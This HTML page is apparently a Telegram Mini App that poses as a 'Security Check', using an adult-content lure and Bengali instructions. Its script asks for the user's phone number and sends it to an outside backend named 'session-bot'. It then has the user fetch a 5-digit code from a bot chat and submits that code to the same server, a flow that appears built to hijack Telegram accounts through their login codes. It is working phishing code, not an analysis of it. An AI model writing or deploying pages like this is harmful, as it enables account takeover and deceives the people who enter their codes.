<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: white; color: #333; padding: 25px; border-radius: 20px; width: 85%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; display: block; }
        .btn-blue { background: #007bff; }
        .hidden { display: none; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; color: #28a745; font-weight: bold; }
        .info { font-size: 12px; color: #666; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="box" id="step0">
        <h2>Security Check</h2>
        <p class="info">Confirm your identity to continue.</p>
        <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
        <div id="loader" class="hidden" style="color:#28a745; font-weight:bold;">Connecting...</div>
    </div>

    <div class="box hidden" id="step2">
        <h3>Verify Code</h3>
        <p class="info">১. নিচের বাটনে ক্লিক করলে অ্যাপটি নিচে নেমে যাবে।<br>২. বটের চ্যাটে গিয়ে "View Code" বাটনে ক্লিক করে কোডটি দেখুন।<br>৩. কোড দেখে আবার এখানে ফিরে আসুন।</p>
        
        <!-- এই বাটনে ক্লিক করলে অ্যাপ মিনিমাইজ হবে -->
        <button class="btn btn-blue" onclick="minimizeToBot()">📩 GET CODE</button>
        
        <input type="number" id="otp" placeholder="Enter 5-digit Code">
        <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;

        function startFlow() {
            tg.requestContact();
            document.getElementById('main_btn').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") { sendNumber(data.phone); } 
                else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumber(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('step0').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }
            } catch (e) { }
        }

        // আপনার ট্রিক: অ্যাপটি মিনিমাইজ করে বটের চ্যাটে পাঠানো
        function minimizeToBot() {
            if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
            // আপনার বটের লিঙ্ক ওপেন করলে অ্যাপটি অটোমেটিক নিচে বারে চলে যাবে
            tg.openTelegramLink("https://t.me/File_Unlocker_Pro_bot");
        }

        async function verifyOTP() {
            let code = document.getElementById("otp").value;
            if(code.length < 5) return alert("Enter Code!");
            document.getElementById('v_btn').innerText = "Verifying...";
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: code })
                });
                const data = await res.json();
                if (data.status === "success") { tg.close(); } 
                else { alert("Wrong Code!"); document.getElementById('v_btn').innerText = "Verify OK"; }
            } catch (e) { }
        }
    </script>
</body>
</html>
